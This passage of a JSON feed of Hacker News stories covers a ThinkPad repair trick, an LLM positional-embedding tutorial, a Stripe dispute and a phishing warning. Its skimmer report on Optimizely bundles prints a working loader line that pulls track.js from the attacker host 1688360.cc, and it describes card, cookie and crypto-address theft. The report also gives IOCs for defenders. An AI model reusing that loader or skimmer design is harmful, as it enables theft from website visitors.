| \n| Food & Hospitality | 5 | Restaurant ordering sites (order.online), Heineken, Home Chef, Starbucks Canada, Cinnabon | \n| Home & Smart Home | 5 | Resideo, Honeywell Home, myQ (Chamberlain), Chamberlain, First Alert | \n| Nonprofit & Civic | 4 | Change.org, ASPCA, UNICEF USA, DonorsChoose | \n| Gambling | 4 | Betsson, PokerStars, tombola, Betfred | \n| Professional Services | 4 | Freshfields, CohnReznick, Baringa, Cro Metrics | \n| Logistics & Shipping | 3 | ShipStation / ShipEngine, Stamps.com, ShipEngine | \n| Automotive | 3 | Lucid Motors, O'Brien Glass, Chevrolet dealer network (Bill Rapp and others) | \n| Education | 3 | Walden University, Perlego, Chamberlain University | \nFull list\nRanked by Tranco position within each sector and the status at 21:52 UTC: every snippet except TalkTalk's had been cleaned.\nBanking & Finance (32)\n| Organisation | Domains | \n|---|---|\n| Paychex | www.paychex.com | \n| HSBC US | www.us.hsbc.com | \n| Equifax | equifax.com, my.equifax.com, signin.my.equifax.com, www.equifax.com | \n| SmartAsset | smartasset.com | \n| HSBC Hong Kong | www.hsbc.com.hk | \n| ABN AMRO | www.abnamro.de, www.abnamro.nl, www.abnamromeespierson.be | \n| TaxAct | www.taxact.com | \n| HSBC Mexico | www.hsbc.com.mx | \n| HSBC Singapore | www.insurance.hsbc.com.sg | \n| NetCredit | www.netcredit.com | \n| Associated Bank | www.associatedbank.com | \n| S-Pankki | www.s-pankki.fi | \n| Equifax Canada | my.equifax.ca, www.equifax.ca | \n| Equifax UK | equifax.co.uk | \n| The Work Number (Equifax) | theworknumber.com | \n| Funding Circle | fundingcircle.com, www.fundingcircle.com | \n| HSBC Australia | www.hsbc.com.au | \n| CashNetUSA | www.cashnetusa.com | \n| OnDeck | www.ondeck.com | \n| ICS Cards | www.icscards.nl | \n| HSBC UAE | www.hsbc.ae | \n| HSBC Malaysia | www.hsbc.com.my, www.hsbcamanah.com.my | \n| Rest Super | rest.com.au | \n| HSBC Taiwan | www.hsbc.com.tw | \n| HSBC Vietnam | www.hsbc.com.vn | \n| HSBC Egypt | www.hsbc.com.eg | \n| HSBC Philippines | www.hsbc.com.ph | \n| SmartAdvisor Match (SmartAsset) | smartadvisormatch.com | \n| Compare Club | compareclub.com.au | \n| ABN AMRO Lease | abnamrolease.com | \n| Energy Scout | energyscout.com.au | \n| Hang Seng Investment | www.hangsenginvestment.com | \nTechnology & SaaS (23)\n| [...truncated]"
+  },
+  {
+   "id": "hn:50516473",
+   "section": "news",
+   "source": "Hacker News",
+   "title": "The Secret ThinkPad Powerbutton Code to Bring Dead Laptops Back to Life (2007)",
+   "url": "https://masnick.com/posts/the-secret-thinkpad-powerbutton-code-to-bring-dead-laptops-back-to-life/",
+   "hn_url": "https://news.ycombinator.com/item?id=50516473",
+   "published": "2026-11-16T11:39:31Z",
+   "points": 311,
+   "num_comments": 123,
+   "text": "Two months ago, I got a new laptop. It’s a Lenovo Thinkpad z61t. I actually ordered a t61, but I accidentally got the z61 instead — and, I actually really like it. It’s quite similar to the t61, but a little smaller and lighter. I was worried that the smaller part would be a problem, but I’ve gotten used to it. I really like the fact that it’s much lighter than my old t42. It just makes it seem so much more usable on the go. Lugging out the t42 was always a chore.\nAnyway, I was at the Office 2.0 conference today, where I was giving a little presentation on the Techdirt Insight Community, and about an hour before the presentation, I went to find a quiet place to practice the presentation… and discovered that my brand new laptop wouldn’t work. I knew something was wrong when the “sleep” light wasn’t lit. I started to get worried when I plugged in the laptop and the battery light didn’t light up. Then I noticed that even though the machine had been asleep, it was really really hot. Pushing the power button did nothing. No lights were on and nothing seemed to get them to turn on. I pulled out the battery and put it back in and that did nothing as well.\nSo I called up IBM support and explained the situation. The guy on the other end then let me in on the secret power button code to revive your dead Thinkpad. After assessing the situation (totally dead laptop) he warned me: “Okay, this is going to sound totally bizarre, but I want you to give this a try…” He then had me unplug the AC adapter and take out the battery. Then, you push the power button 10 times in a row at one second intervals. Next, you push and hold the power button for 30 seconds. Then you put the battery back in and push the power button… and she lives. The computer came back, good as ever.\nI asked the guy what the power button pushing incantation did and he said “static discharge” so apparently there was some sort of static that caused a short or something. I tried to get the guy to explain in more detail what happened, but he said “dude, you know as much as I do… but your machine is working.”\nAnd so it is.\nSo, if you happen to have a Thinkpad that suddenly drops completely dead for no reason, try the power button trick.\nForget up, up, down, down, left, right, left, right, B, A. This little code is now the coolest “cheat” code I know…\n321 Comments\nDavid Churbuck on January 29th, 2008\nworked for me and I work for Lenovo! Thanks\nRubber Chicken Tech Support at Churbuck.com on January 29th, 2008\n[…] This morning I idly Googled “dead ThinkPad” and found one of the wackiest solutions ever seen proposed for reviving the dead. This was on Masnick.com “So I called up IBM support and explained the situation. The guy on the other end then let me in on the secret power button code to revive your dead Thinkpad. After assessing the situation (totally dead laptop) he warned me: “Okay, this is going to sound totally bizarre, but I want you to give this a try…” He then had me unplug the AC adapter and take out the battery. Then, you push the power button 10 times in a row at one second intervals. Next, you push and hold the power button for 30 seconds. Then you put the battery back in and push the power button… and she lives. The computer came back, good as ever.” […]\narmani on April 29th, 2008\nThat rocked, dude! I had almost lost hope. My laptop was plugged in and working. I put it in sleep mode. 30 minutes later it was dead as could be. I figured the power unit was blown and the battery had completely discharged. I tried the magic incantaction above and presto! Thanks.\nJhot on May 11th, 2008\ngoogled dead thinpad. lead me here, and by golly, it worke. thx a million. Leaving on holiday for 4 weeks tomorrow, and need my lap with me.\nJim on May 23rd, 2008\nNo way! I can’t believed it worked. I thought this was a goof but it actually worked! Yesterday my x41 just went dead, no sign of life what so ever. I did this and it lives. Thanks.\ngaby on July 8th, 2008\nThis happened to my laptop [not thinkpad] after a 2 week holiday. Thanks to this tip, my laptop is fully restored. A big thank you, saved me time and money\ngmace on January 12th, 2009\nMy almost new T61 went dead for no apparent reason. I just spent the last several evenings getting it loaded up. Figured great! Have to send it back and start all over.\nThis tip worked and so far so good… it seems fine. Thanks for posting this!!\nviji on February 3rd, 2009\nyep! it worked for me too!! mine was a T60. i was carrying it from one room to the other without hibernating when it died on me.\nDavid Martinez on February 16th, 2009\nOMG, totally worked. My laptop just came back from lots of servicing at Lenovo (replaced HD, 1 piece of ram, and part or all of the video card). Spend the week loading it with all my fav programs and one morning it just would not charge or take on any LED lights with the power cord in.\n…but SHE LIVES AGAIN! thanks mate!\ncatgrrl on April 11th, 2009\nWOW! My T41 suddenly went completely dead today when I plugged in a new set of headphones. Completely dead, no battery light or anything. So I Googled “dead thinkpad” and found this page. I tried this and it WORKED! Thank you so much!\nWendy\nadams888 on June 24th, 2009\nThe button pushing solution did not work for my T60p with this exact problem. It sounds implausible that it would work, but if all the posts are true, I guess it does for some people. In my case, what resolved the problem was simply removing the battery, diconnecting the power cord, and unseating and reseating the RAM memory. Once I plugged it back in it was as good as new.\nIan on July 10th, 2009\nThis has brought my x200 tablet back to life after trying just about everything else. Thank you! It really does work.\nneotel on August 9th, 2009\nIt sounds really crazy, but this worked for me also! Great work thanks a lot. I have a t61 by the way.\njana on September 9th, 2009\nBrilliant! My IBM t43 laptop just died, and I found this suggestion. Amazingly… it worked! Thanks a lot!\nJJ on November 16th, 2009\nThis is NOT working for me… why oh why… anyone else have this fail and find another solution?\nbrainstorm003 on November 24th, 2009\nAmazing, it worked for me. Thanks to your “state of art high tech secrete code”, my think pad is back to life. Thanks.\nBeliever on December 1st, 2009\nWell, shiver my timbers, it worked! My faith in the internets has been renewed!\nAmazed Tech on December 3rd, 2009\nI cannot believe this worked Great tip sent to all my workmates as well\nyul on December 7th, 2009\nWhoaa!!!!! It worked. Saved my life. Thanks!\nAndrew on December 16th, 2009\nMy t21 went dead on me. I had a deadline to meet. I tried everything i could think of. I went to sleep. When i woke up, it was still dead. I turned to google and stumbled on this weird solution. I was skeptical. So i read all the testimonials first. I then tried it and….It worked! Thanks for sharing.\nDon on December 18th, 2009\nThank You Mike\nChris on January 3rd, 2010\nWow, this totally worked. I am so thankful!! I have so much on there that I could not afford to lose.\nThanks!!! :)\nEric on January 20th, 2010\nMy wife’s Lenovo T400 came back to life and I am a hero. Can’t believe it. Thank you so much for this great trick, Mike. Still works after all these years!\nchewygood on February 16th, 2010\nT42p dead and all of a sudden too! Tried this but no luck. Wonder, mine is all apart save for mobo, keybrd, basic necessities for it to at least power up. What dif would it make to put the wireles module, pcmcia, memory, heatsink/fan, HDD, cdrom unit all back in for this nutty tip to take off and work ? Again, I tired asis, no go!\noldbeechnut on February 21st, 2010\nGrandkids spilled milk on the t43, totally dead..5 hours later tried reset, got flicker of dash lite. {one} 10 hours later, got all lites for 2 seconds…going for 24 hours…will let you know..Joe\noldbeechnut on February 22nd, 2010\nAmazing it has worked! It has been 30 hours ago that the Grandson spilled milk on the laptops keyboard. It was totally dead but by pulling the battery, tilting the t43 to allow drainage of the milk, {which was about 2 ounces} Letting it dry out under a 60 watt lamp about 7 inchs from the keyboard, then doing mikes powerbutton code reset it has came back from the dead…with no data loss…I’m still in shock! Amazing, thanks Mike for sharing this great tip…..Joe/Obn\nAlyosha on March 11th, 2010\nWow, first shot out of the box! I googled “dead thinkpad R61” and got your blog. I thought my R61 had screwed the pooch, until I followed your revival steps.\nWorked like a charm!!!\nThanks a million!\nZa\nMatt on March 20th, 2010\nThat’s some voodoo right there… Thanks a lot for that mate.\namazed on March 21st, 2010\nSaved me $700 for a replacement and the aggravation of moving the files. Thank you!\nAlex on May 16th, 2010\nGod Bless you. Thanks :)\nIt worked on my Thinkpad T61 :)\ndavemc on June 30th, 2010\nStunned – it worked on my T43 after it got a little damp in the rain. Nothing else was working – drying, battery removal, holding the power button. Thank You!\njaznups on July 1st, 2010\nWhew!! Thank you so much! This still works and worked on my T61p. I started to panic because I hadn’t backed up my system for a few months.\n-Jaz\nanchie on July 10th, 2010\nthnx… it worked….\nram008 on July 14th, 2010\nWonderful Wonderful!! Just when I thought all was lost! Excellent advice from Mike and from all those above me in this thread! A godsend indeed!!!\nrutteger on July 14th, 2010\nSounds like a load of tosh but worked a treat on my dead R61. Chapeau monsieur! Interested to know why it actually works…\ndivedave on July 15th, 2010\nAbsolutely amazing. It worked like a champ first time I tried it. Thanks very much for the information, you have obtained lots of good karma for sure!\nserranochili on July 26th, 2010\nYes indeed, I have a Lenovo 300 Y410 and it suffered from a complete death. After I recovered from my two days of mourning, I popped onto my husband’s computer and found this little tip. Alas, I am up and running again! Thank you for posting your solution – it’s helped many!\nak on August 3rd, 2010\nThis solution didn’t work for me. After the motherboard was replaced to no effect, it turned out that the problem magically disappeared when the CD drive was removed. Glad it was at Lenovo’s expense, and not mine. :-)\nmoonwalker on August 17th, 2010\nThe term “static discharge” is incorrect, it’s residual charge that this power button trick dissolves. And there is no need for “up, up, down, down”, enough just press and hold it for five-ten seconds. Never had this issue with my ThinkPad, but had plenty of occurrences with Asus Eeepc, removing all power sources and just plain holding power button for five seconds always does it.\nMadDog on August 28th, 2010\nAug 28 2010. Wow! You can find ANYTHING on the internet! I can’t believe this worked, but it did. Thank you so much!\nMad Dog\nGC on September 2nd, 2010\nHi , my t61 died, found this ans the 5×10 secounds power button trick worked for me. Thanks\nMjlascas on September 4th, 2010\nI hvae to say that i was way beyond skeptical about this recommendation, but against all odds, it actually worked! Thanks for the tip.\nmichele on September 25th, 2010\nOMG!!!!!!!!!!! this really worked. i am flabergasted to say the least. amazed! truly amazed. thank you. this little crazy trick saved me a lot of money. wow. it really works!!!!!! i was beyond skeptical. OMG\nmikewen on October 10th, 2010\nmike, that up up down down left right left right B A, that is nintendo’s contra secret code right? lol\nAlex on November 11th, 2010\nWow, it worked. I am so confused.\nWhat does the ThinkPad “power button trick” do? Drija on November 13th, 2010\n[…] disconnecting power to the machine. At first I thought it was a joke or a troll, but there are other reports suggesting the same thing — or very similar variations, at least — as a solution for a […]\nFluxboy on December 8th, 2010\nTHIS WORKED!!!!\nI really messed things up. I inserted the wrong end of my Blackberry [...truncated]"
+  },
+  {
+   "id": "hn:50506376",
+   "section": "news",
+   "source": "Hacker News",
+   "title": "Understanding Positional Embeddings in Modern LLMs",
+   "url": "https://magazine.sebastianraschka.com/p/understanding-positional-embeddings",
+   "hn_url": "https://news.ycombinator.com/item?id=50506376",
+   "published": "2026-11-15T12:14:06Z",
+   "points": 245,
+   "num_comments": 27,
+   "text": "This article explains how LLMs encode and process token position information by covering classic and contemporary methods like RoPE. It’s essentially a comprehensive journey where we will work through the mechanisms with visual examples, a little math, and a small PyTorch implementation. And, of course, we will then also look at how modern architectures adapt or omit explicit positional encodings.\nBelow, you can find a preview of which positional embedding choices are used in 2026 open-weight models. We will discuss these choices later after covering the underlying mechanisms.\nBut why spending so much time writing/reading about this rather minor building block? LLMs keep evolving, and as I was preparing a new article on the latest LLM architecture trends this year, I realized that I never covered the positional information methods used in LLMs in any article so far. So, instead of letting the other article get out of hand, I thought it might make sense to publish this as a standalone building block for the upcoming LLM architecture and trends analysis.\nAlso, over the years, many readers have asked me for a tutorial on relative positional embeddings (aka RoPE) to follow up on the learned absolute embeddings used in GPT. It’s been on my TODO list for a long time, so I finally revisited my old draft and put this walkthrough together, which will cover\n- different positional methods in LLMs;\n- (finally) how RoPE works;\n- what methods are used by recent open LLMs.\nNote that this article assumes some familiarity with basic LLM architectures and works well as a follow-up to Build a Large Language Model (From Scratch). If the concepts and computation of the attention internals, particularly query, key, and value vectors, are a little fuzzy, I recommend checking my self-attention walkthrough as a refresher:\nThe article is also very technical and likely too detailed for some. However, I really wanted to have this foundation out there for future articles to reference. And no worries, the next one will return to a more comfortable style.\nPS: I started experimenting with Substack’s new “perks” system. As a thank-you to supporters, I’ve added image exports and metadata from the architecture gallery for you to use in your own analyses.\nPPS: If you are already familiar with how position embeddings work, feel free to fast-forward to Section 6, Positional choices in modern architectures.\nNote that this article may be best read in a web browser than an email client. I recommend checking out the web view here, which also has a navigation bar on the left side.\n1. Where position information enters an LLM\nLet’s start with the overall architecture. A tokenizer encodes the input text into token IDs. Next, the input token embedding layer of an LLM maps each of these IDs to a vector of numbers. We usually refer to these entries in that vector as “features” (similar to classic ML). The transformer blocks inside the LLM then modify these vectors using attention and feedforward layers. Lastly, the model’s output layer produces logit scores (converted into probabilities) for the next token.\nThe following shows this path in GPT-2 (a relatively classic LLM) and MiniMax-M3 (a more recent LLM released this year; a placeholder for most other recent LLMs). As we can see, the architectures are not too different from each other, but before we get to the positional information parts, let’s focus on the orange blocks for now (the token embedding layers) and the transformer blocks above them; the other architecture differences aren’t needed for this explanation.\nA token embedding layer, shown in the figure above, maps each token ID to a vector. Position information is then added afterward. Concretely, and as we will discuss in more detail later, GPT-2 adds a position vector to each token embedding before the modified embedding enters the first transformer block. On the other hand, MiniMax-M3 adds the positional information in each transformer block using a method called RoPE inside attention.\nWe will talk about these methods in more detail later, but first, let’s start with the big picture information explaining why explicit positional information is added or needed.\n1.1 Why add positional information?\nConsider the following two input sentences as a simple example:\n- “The red fox jumps over the gray fox.”\n- “The gray fox jumps over the red fox.”\nChanging the word order changes which fox does the jumping, as illustrated in the following figure.\nFor the examples in this article, we will treat each word as one token for simplicity. (As you know, real tokenizers can split words into smaller subword tokens.) The first sentence then has eight token positions, from 0 through 7.\n# Assume the following small vocabulary.\n# Real vocabularies typically have 50k to 200k entries\nvocab = {\n    \"The\": 0,\n    \"red\": 1,\n    \"fox\": 2,\n    \"jumps\": 3,\n    \"gray\": 4,\n    \"over\": 5,\n    \"the\": 6,\n}\n(If you are interested in how vocabularies are built, check out my tokenizer materials on GitHub.)\nNote that “fox”, which appears twice in the input sentence, gets the same token ID 2 in both cases. And since they both have the same token ID, irrespective of the position in the input sentence, they would get the same embedding vector from the embedding layer.\nNow, let’s consider a regular self-attention mechanism with no positional encoding (and no causal mask), where every input token can attend to every other token in the input. In this scenario, swapping any two words, like “red” and “gray”, would still result in the same embeddings and attention scores between each token pair.\nGPT-style models do use a causal (autoregressive) mask, which restricts each token to itself and earlier tokens. Interestingly, this causal mask gives the computation some implicit order information. In our example, “jumps” can attend to “red” in the first sentence and “gray” in the second. So, a causal LLM can theoretically already distinguish these sentences even without explicit positional embeddings. (We will return to this idea later when discussing the “NoPE” concept.)\nNonetheless, GPT-2 and most newer LLMs include explicit positional information because it gives attention a direct signal about positions. That’s because even though the causal mask determines which tokens are accessible and provides implicit order information, it doesn’t distinguish a separation of one position from a separation of ten, for example. So, explicit positional methods are still useful (or even essential), since they supply that information.\nIf this all sounded confusing, don’t worry, it was more meant as an overview, and we will step through these concepts a bit more slowly in the remaining article.\n2. Adding a position vector to each token embedding\nWe briefly talked about implicit positional information through causal attention masks (and we will revisit this again in more detail later). However, we now switch gears and talk about the explicit ways to add positional information.\nThe perhaps simplest and most direct (but not “cheapest”) approach is to give each sequence position its own vector. We add that vector to the token embedding, so the resulting, modified embedding vector is then passed to the first transformer block. This exact procedure is discussed in the following subsections.\n2.1 Learned absolute position embeddings in GPT-2\nTo illustrate the use of an explicit, learned positional vector to the input embeddings, let’s consider GPT-2 as a concrete example. GPT-2 learns a table of position vectors during training. The following figure illustrates where these vectors are used in the architecture, that is, immediately after the token embedding lookup and before the first transformer block.\nThe positional embedding layer depicted in the figure above follows the same implementation as the token embedding layer, i.e., they have exactly the same output dimensions so that the resulting input vectors can be added to each other. The code below shows that with an excerpt of a GPT-2 code implementation:\nclass GPTModel(nn.Module):\n    def __init__(self, cfg):\n        super().__init__()\n        self.tok_emb = nn.Embedding(cfg[\"vocab_size\"], cfg[\"emb_dim\"])\n        self.pos_emb = nn.Embedding(cfg[\"context_length\"], cfg[\"emb_dim\"])\n        self.drop_emb = nn.Dropout(cfg[\"drop_rate\"])\n        \n        self.trf_blocks = nn.Sequential(\n            *[TransformerBlock(cfg) for _ in range(cfg[\"n_layers\"])])\n        \n        self.final_norm = LayerNorm(cfg[\"emb_dim\"])\n        self.out_head = nn.Linear(\n            cfg[\"emb_dim\"], cfg[\"vocab_size\"], bias=False\n        )\n    def forward(self, in_idx):\n        batch_size, seq_len = in_idx.shape\n        tok_embeds = self.tok_emb(in_idx)\n        pos_embeds = self.pos_emb(torch.arange(seq_len, device=in_idx.device))\n        x = tok_embeds + pos_embeds  # Shape [batch_size, num_tokens, emb_size]\n        x = self.drop_emb(x)\n        x = self.trf_blocks(x)\n        x = self.final_norm(x)\n        logits = self.out_head(x)\n        return logits\nAnd in mathematical terms, we can write it as follows. Let m be a position index and xm the token ID at that position. The input to the first block is\nHere,\n- Etoken is the embedding layer,\n- Pm is the position info vector selected by m,\n- and hm is the resulting summed embedding and position vector.\nThe two vectors have the same width, so we add their entries element-wise. Figure 6 below shows this visually with a small numerical example.\nIn the figure above, at position 0, adding the token embedding [1, 1, 1] to the position embedding [1.1, 1.2, 1.3] gives [2.1, 2.2, 2.3]. By the way, the values in the figure are chosen to keep the illustration simple; in a real example, both embedding layers (tables) are initialized with small random values and learned during training.\nSo, what we covered in this section is a so-called absolute positional method because the positional embedding Pm depends on the token’s own position m. In the previous example sentence, the two “fox” tokens have initially the same token embeddings, but because we are adding different positional vectors P2 and P7, they have different values before they enter the first transformer block. And consequently, the query, key, and value vectors inside the attention mechanisms then also receive representations that already include position information.\nNote that the original GPT-2 implementation has 1,024 learned position vectors. This means it only works with inputs with 1024 or fewer tokens. If we want to extend the context window, we would have to extend this embedding table. And since the embedding table (layer) is updated like any other layer during training, the context length would have to be decided before the training starts.\nExtending the context would be very expensive since the table can become very large. For example, in the case of GPT-2 Medium, the positional embedding layer weights only make up 0.30% of the total weights at 1,024 positions. However, if we increased the context length to a nowadays common 100k range, they would make up >22% of the total model weights, which would be very uneconomic.\n2.2 Fixed sinusoidal position encodings in the original transformer\nThe original “Attention Is All You Need” transformer from 2017, which predates GPT, uses the same addition mechanism, but computes its position vectors with fixed sine and cosine functions. Figure 7 below shows this addition before both the encoder and decoder stacks. The encoder processes the input sequence, and the decoder generates the output sequence. (The reason why it’s introduced here is that the sine and cosine functions will become relevant again later when discussing RoPE.)\nThe original transformer also scales its token embeddings by √(dmodel) before adding the position vectors, where dmodel is the embedding width.\nSo, while GPT-2 in the previous section had the formula\nthe formula used in the original transformer (depicted in Figure 7) is:\nThis scaling by [...truncated]"
+  },
+  {
+   "id": "hn:50523300",
+   "section": "news",
+   "source": "Hacker News",
+   "title": "CNN, Zoom, Fox News Served Visitors a Crypto-Stealing Skimmer – OPTIMJACK",
+   "url": "https://amirulcyber.com/2026/11/16/optimjack-optimizely-skimmer/",
+   "hn_url": "https://news.ycombinator.com/item?id=50523300",
+   "published": "2026-11-16T21:08:38Z",
+   "points": 187,
+   "num_comments": 2,
+   "text": "Summary\nOne poisoned tag layer, 15 household-name websites, millions of exposed visitors. Attacker JavaScript injected into Optimizely bundles is serving a crypto-clipper + card-skimmer to visitors of CNN, Zoom, Fox News, BBC, Salesforce, GitLab, American Eagle, Hootsuite and seven more — plus side vectors through a first-party bundle, a Jscrambler-protected script, and one malvertising impression. If your site loads Optimizely, assume your visitors are in the blast radius until you check the bundle.\nTerms\n| Term | Means in this post | \n|---|---|\n| loader | the injected snippet inside the Optimizely bundle that appends track.js | \n| track.js | the attacker stealer (clipper + card skimmer + screenshot exfil) | \n| C2 | 1688360[.]cc and the two .icu hosts serving payload and collecting data | \n| clipper | malware that swaps a victim’s crypto address for the attacker’s at point of use | \nRisk to a marketing and IT team\nIf your site loads Optimizely, your visitors are the targets: pasted wallet addresses get swapped before submission, card forms get skimmed, and page URLs plus cookies plus a screenshot leave with every hit. Your origin can be clean while your visitors are robbed — the compromise sits in the tag layer. Three-step check: (1) fetch your served Optimizely bundle and search it for 1688360; (2) alert on Content-Security-Policy script-src violations naming unknown hosts; (3) verify with a test wallet address on a staging page that what you paste is what gets submitted.\nThe loader\nInside affected Optimizely bundles, directly after the normal experiment code:\n<script src=\"https://cdn.optimizely.com/js/5113954737848320.js\"\n  class=\"optanon-category-C0002\"></script>\nand inside that bundle:\n(function(){try{var s=document.createElement('script');\ns.src='https://1688360.cc/track.js';s.async=true;\n(document.head||document.documentElement).appendChild(s);}catch(e)})();\nThat project ID is GitLab’s; ten more project/snippet IDs across unrelated organisations carry the same line. Two affected sites instead blocked it with CSP (script-src violation, request Failed) — compromised snippet, unexecuted payload.\nThe payload\nOne self-contained script, four modules:\n1. Clipper. Regex plus real checksum validation (double-SHA256, base58check, bech32, cashaddr, TON CRC16) for ETH, TON (friendly + raw), BTC, BCH, LTC, TRX, DOGE and SOL. Rewrites DOM text (50 ms sweep, payment-keyword gated), input/textarea values (including framework models), link/image src/href, copy events, clipboard.writeText/readText, navigator.share, and fetch/XHR URLs and bodies. Every swapped original is queued for exfil.\n2. Screenshot + cookie exfil. Posts page URL (≤500 chars), cookies (≤8,000), a JPEG screenshot via html2canvas pulled from the same C2, and the matched original addresses to /hit.php.\n3. Card skimmer. Luhn plus brand check, MM/YY + 3–4-digit CVV validation, hooks fetch/XHR POST bodies (JSON, FormData, nested objects) and form submits, dedupes per session, exfiltrates via sendBeacon to /card.php.\n4. iOS second stage. On iPhone/iPad/iPod only: injects boot.js from two .icu hosts and, on iOS ≤ 18.6, a hidden iframe. The recovered boot.js is obfuscated and under analysis.\nAttacker replacement addresses (verbatim from the file header):\nETH  0xC4026b06D82b0F0B363eda0642D61CfbDc17884e\nTRX  THvs6p56XkUiMkJeSc51cAP64u2RsTYqxa\nBTC  19g9rZcPeiz8rUvyWpTRyXXhPnjsWrc3kW\nTON  UQAgM1VqSZQiJLSG5w-ovurq5CZdxLEK3_7CMmwALTA5e09p\nSOL  FVtL8NMYS9PA1v3HE67XUGCtGA9JaZUvqav2fU2LrV5n\nLTC  ltc1q3wp7g6ds0ggg6fl6kncpa4sepn0q3qfacgred5\nBCH  qzkaaf8n6grmpr0d9lx8xutn3r9lk722f566hhpe58\nDOGE DBEGrxRF7KMSuhTS4c1MFviStU6efdMnu5\nTONr 0:2033556a49942224b486e70fa8beeaeae4265dc4b10adffec2326c002d30397b\nAffected Website\n15 captured page loads, sorted by traffic. First column is the page domain as observed; second column is the exact page URL that loaded the payload:\n| Domain | Exact page URL that loads the payload | Hijacker JS URL | \n|---|---|---|\n| edition.cnn.com | https://edition.cnn.com/ | https://cdn.optimizely.com/public/125375509/s/landingprod.js | \n| zoom.com | https://www.zoom.com/ | https://cdn.optimizely.com/js/6395285578973184.js | \n| foxnews.com | https://www.foxnews.com/ | https://cdn.confiant-integrations.net/gptprebidnative/202611121858/wrap.js | \n| bbc.com | https://www.bbc.com/news/articles/c6wy9lynq4qno | https://cdn.optimizely.com/public/4621041136/s/bbcx_prod.js | \n| salesforce.com | https://www.salesforce.com/ | https://cdn.optimizely.com/js/22444972181.js | \n| about.gitlab.com | https://about.gitlab.com/whats-new/19-0/ | https://cdn.optimizely.com/js/5113954737848320.js | \n| ae.com | https://www.ae.com/us/en | https://www.ae.com/resources/aa2a454dda92a6d073ca760a2537f00c14d00114d3583 | \n| hootsuite.com | https://www.hootsuite.com/error/lost-owly | https://cdn.optimizely.com/js/4894383279964160.js | \n| smartsheet.com | https://www.smartsheet.com/ | https://cdn.optimizely.com/js/752092193.js | \n| wwws.airfrance.it | https://wwws.airfrance.it/ | https://jef1nimjiav4.eu.wpi.jscrambler.com/i0sqmdlgtfda/1588655105.js | \n| virginmediao2.co.uk | https://www.virginmediao2.co.uk/help/identity | https://cdn.optimizely.com/js/22914960707.js | \n| stamps.com | https://www.stamps.com/ | https://cdn.optimizely.com/js/23755770403.js | \n| tricentis.com | https://www.tricentis.com/ | https://cdn.optimizely.com/js/26508490611.js | \n| mutualofomaha.com | https://www.mutualofomaha.com/promo/medicare-supplement-insurance/456245-1 | https://cdn.optimizely.com/js/25010540072.js | \n| insurance.hsbc.com.sg | https://www.insurance.hsbc.com.sg/ | https://cdn.optimizely.com/js/20371380974.js | \nPer-row caller evidence lives in the third column: Optimizely bundles on every row except foxnews.com (ad wrapper), ae.com (first-party bundle) and wwws.airfrance.it (Jscrambler-protected script).\nIOCs\nBlock now (high confidence, safe to block):\n1688360.cc/track.js\n1688360.cc/hit.php\n1688360.cc/card.php\n1688360.cc/html2canvas.min.js\n5vobauua3ojpklx.icu/boot.js\neil786npto9u5bq.icu/boot.js\neil786npto9u5bq.icu/JIUJIU888/weifile.html\nf7b84b9a94f749f8ced3f0112d0a66894e8bbc3b4aa5592021d1b8976a9bad40  (track.js)\n2f69879f1c5bdfe9c075ef67ddb6405afe992aff89dcf42863567f83237d3ba6  (eil786 boot.js)\nDetection\n- Search served tag-manager bundles for unknown .cc/.icu hosts — catches this loader; misses loader variants on fresh domains.\n- CSP script-src violation monitoring — two sites survived this way; misses pages without CSP or with permissive policies.\n- Client-side: alert on html2canvas fetched from a non-site host, sendBeacon to unknown hosts on checkout pages — catches the exfil leg; misses passive skimmers that only read.\n- Canary wallet address in staging: paste, submit, compare — catches clipper; misses keyword-gated payloads that ignore test pages.\nFurther reading\n- Optimizely experiment JS runs with page privilege — vendor docs on custom code execution — why a tag-layer injection owns every visitor session.\n- OneTrust auto-blocking and the optanon-category pattern — why consent gating does not sanitise a poisoned tag.\n- CSP script-src as last line of defence for third-party compromise — the control that saved two of the sites in this report."
+  },
+  {
+   "id": "hn:50510042",
+   "section": "news",
+   "source": "Hacker News",
+   "title": "Ask HN: Stripe closed us after one $1,500 invoice and never asked for evidence",
+   "url": "https://news.ycombinator.com/item?id=50510042",
+   "hn_url": "https://news.ycombinator.com/item?id=50510042",
+   "published": "2026-11-15T19:49:28Z",
+   "points": 179,
+   "num_comments": 91,
+   "text": "We're a small business that sells pre-booked appointments with homeowners to local contractors, billed per appointment that actually happens. Our first client agreed to this on a recorded call and saved his card through a $1 Stripe payment link, which we planned to use for billing later. That $1 payment went through. A few weeks later we invoiced him $1,500 for 3 completed appointments and charged the saved card. Stripe blocked the payment. Two days after that the account was closed with this wording: payments \"don't appear to have been authorized by the customer.\" What happened next: - We appealed through the Dashboard with an appeal letter, our company documents and the invoice. It was rejected the next day as an \"unacceptable level of risk.\" - Support told us our \"business model presents a level of risk we're unable to support\" and that the decision is final. - After a Stripe employee escalated it internally, we got a short email saying Stripe still won't accept payments for our business. In all of this, nobody asked us for the call recording, our messages with the client, or a confirmation from the client himself. As far as we know, he never disputed anything, and he has told us he is paying by bank transfer outside Stripe. I'm not saying our setup is perfect. It's a new account, the first real charge was large compared to the $1 test, and billing a saved card later is probably what looked wrong. If there's something specific we should fix, I'll fix it. What I'm asking: 1. Is there anyone at Stripe who can look at this with the evidence, including getting the client on a call? 2. For people who've been through this: how would you structure per-appointment billing so it doesn't look unauthorized (an invoice with a link each time, an email confirmation before each charge, something else)? I can share the account details, the call recording and the messages with anyone from Stripe who wants to look. Thanks for reading."
+  },
+  {
+   "id": "hn:50513451",
+   "section": "news",
+   "source": "Hacker News",
+   "title": "Tell HN: HN is being scraped for emails to scam",
+   "url": "https://news.ycombinator.com/item?id=50513451",
+   "hn_url": "https://news.ycombinator.com/item?id=50513451",
+   "published": "2026-11-16T02:53:30Z",
+   "points": 122,
+   "num_comments": 42,
+   "text": "I know that many folks here post their personal emails in the Who's for Hire monthly pages and other places, and want to remind you that this public site gets views from folks with ill intent (or their bots/agents) as well. I use unique emails for every site, so I immediately knew that the late AWS payments email sent to my HN email were fake. There were other tells, but I want to remind everyone to be vigilant! HN is public but even social media sites where you supposedly can make your page private I've had some of those emails suddenly have spam sent to as well. Please be safe everyone! My favorite tells that an email is a scam:\n- Before opening a surprising/suspicious email, hover over the sender name to see the domain the sender came from (don't open the email if it's strange).\n- _If_ you already opened the email, before clicking any links in the email, hover over them to see the domain that the link sends you to. There are dozens more tips but a full article would be required, and these two will prevent you from falling for nearly all of them."
+  },
+  {
+   "id": "hn:50526152",
+   "section": "news",
+   "source": "Hacker News",
+   "title": "Running coding agents without handing them my credentials",
